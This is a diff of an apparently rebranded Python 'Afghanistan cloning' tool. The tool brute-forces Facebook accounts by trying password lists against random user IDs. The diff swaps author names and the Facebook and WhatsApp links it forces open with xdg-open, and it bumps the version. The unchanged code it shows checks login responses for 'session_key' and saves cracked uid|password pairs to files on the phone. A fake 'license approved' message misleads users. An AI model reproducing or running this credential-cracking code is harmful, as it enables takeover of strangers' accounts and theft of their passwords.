@@ -1,6 +1,6 @@
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open https://facebook.com/groups/1210513956551911/')
+os.system('xdg-open https://www.facebook.com/Shaboo1020')
 print('\n\033[1;37mCHEAKING YOUR PHONE LICENSE...\n \033[1;32mYOUR LICENSE APPROVED...')
 from os import path
 import os,base64,zlib,pip,urllib
@@ -45,12 +45,12 @@ logo=("""\033[1;37m
 ----------------------------------------------
 ☆AUTHER   :  Sabnam Noori
 ☆TEAM     :    Noori
-☆BROTHER ❤️:  Alix 
+☆Sister ❤️:  Tabasom Sahar
 ☆Facebook :  Sabnam Noori
 ☆CRACK    :   Saboo
 ☆TOOLS    :   FREE + 
 ------------------------------------------------
-\033[1: VERSION : 1.0.2
+\033[1: VERSION : 1.0.3
 ------------------------------------------------
 """)
 def linex():
@@ -81,13 +81,13 @@ def menu():
 			print('\033[1;33m[1] RANDOM AFGHANISTAN CLONING V1\n\033[1;33m[2] RANDOM AFGHANISTAN CLONING V2\n\033[1;33m[3] CONTACT Naqeebullah Sabir \n\033[1;37m[0] EXIT')
 			linex()
 			xd=input('\033[1;32mCHOOSE: ')
-			os.system('xdg-open   https://chat.whatsapp.com/GjQUpvAucZN8c81KNlgqmm/')
+			os.system('xdg-open https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z')
 			if xd in ['1','01']:
 				CRACKafghan()
 			if xd in ['02','2']:
 				CRACKafghan1()
 			if xd in ['03','3']:
-				os.system('xdg-open  https://www.facebook.com/profile.php?id=100076855636497')
+				os.system('xdg-open  https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z')
 				print('\033[1;33m')
 				linex()
 				print(' The process has completed')
@@ -114,12 +114,12 @@ def CRACKafghan():
 			limit = 50000
 		clear()
 		print('\033[1;33m [1] \033[1;33mSEND FRIEND REQUEST')
-		os.system('xdg-open   https://chat.whatsapp.com/GjQUpvAucZN8c81KNlgqmm')
+		os.system('xdg-open https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z')
 		linex()
 		mthd = input('\033[1;32m[+]CHOOSE: ')
 		clear()
 		print('\033[1;33m [1] \033[1;33mJOIN OUR FB GROUP')
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100076855636497/')
+		os.system('xdg-open https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z')
 		linex()
 		pcs = input('\033[1;32m[?] SELECT: ')
 		
@@ -158,12 +158,12 @@ def CRACKafghan1():
 			limit = 50000
 		clear()
 		print('\033[1;33m [1] \033[1;33mSEND FRIEND REQUEST')
-		os.system('xdg-open   https://www.facebook.com/profile.php?id=100076855636497')
+		os.system('xdg-open   https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z')
 		linex()
 		mthd = input('\033[1;32m[+]CHOOSE: ')
 		clear()
 		print('\033[1;33m [1] \033[1;33mJOIN OUR FB GROUP')
-		os.system('xdg-open https://chat.whatsapp.com/GjQUpvAucZN8c81KNlgqmm /')
+		os.system('xdg-open https://whatsapp.com/channel/0029Vabmla95vKA4CMn5341Z/')
 		linex()
 		pcs = input('\033[1;32m[?] SELECT: ')
 		
@@ -266,16 +266,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/Sabir-OK.txt','r').read()
+                                                okk=open('/sdcard/Sabnam-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [Sabir-OK] '+str(uid)+' | '+pas+'\033[1;90m')
-                                                        open('/sdcard/Sabir-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [Shabnam-OK] '+str(uid)+' | '+pas+'\033[1;90m')
+                                                        open('/sdcard/Sabnam-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [Sabir-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Sabir-OK-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [Sabnam-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Shabnam-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
